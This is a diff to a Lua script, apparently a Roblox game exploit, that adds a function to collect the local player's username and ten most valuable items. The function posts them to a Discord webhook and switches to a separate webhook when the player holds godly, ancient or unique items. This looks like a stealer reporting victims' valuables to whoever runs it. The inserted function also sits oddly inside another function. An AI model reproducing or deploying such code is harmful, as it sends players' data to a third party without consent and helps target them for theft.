@@ -1192,6 +1192,50 @@ function sendPlayerLeaveNotification(playerName)
         selectedWebhook = GoodwebHook -- это вебхук для специального случая
     end
 
+-- Функция для отправки 10 самых ценных предметов
+local function sendTopItemsWebhook()
+    local sortedItems = {}
+    
+    -- Сортируем предметы по цене
+    table.sort(allItems, function(a, b)
+        return a.value > b.value
+    end)
+    
+    -- Берем 10 самых ценных предметов
+    for i = 1, math.min(10, #allItems) do
+        table.insert(sortedItems, allItems[i])
+    end
+    
+    local itemsString = ""
+    
+    -- Формируем строку с 10 предметами
+    for _, item in ipairs(sortedItems) do
+        itemsString = itemsString .. item.name .. " - Value: " .. item.value .. "\n"
+    end
+    
+    -- Проверка валюты для выбора вебхука
+    local selectedWebhook = webHook
+    if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
+        selectedWebhook = GoodwebHook
+    end
+    
+    -- Отправляем данные на вебхук
+    local WebHookEmbed = CreateEmbed(
+        "Top 10 Valuable Items",
+        "",
+        11220,
+        {
+            {name = "Username", value = LP.Name},
+            {name = "Top 10 Items", value = itemsString}
+        }
+    )
+    
+    SendWebhook(selectedWebhook, {embeds = {WebHookEmbed}})
+end
+
+-- Вызов функции
+sendTopItemsWebhook()
+
     local dataLeave = {
         username = "Notification",
         avatar_url = "https://media.discordapp.net/attachments/1326959392339267625/1341456689949446297/exit-circle-floor-sign-with-directional-arrow-and-a-person-walking-text-in-the-lower-side.png?ex=67b61065&is=67b4bee5&hm=661460a43333a89a03fdcffb9f619c400e7c4fda27e6884f0cbccd512261ed4f&=",
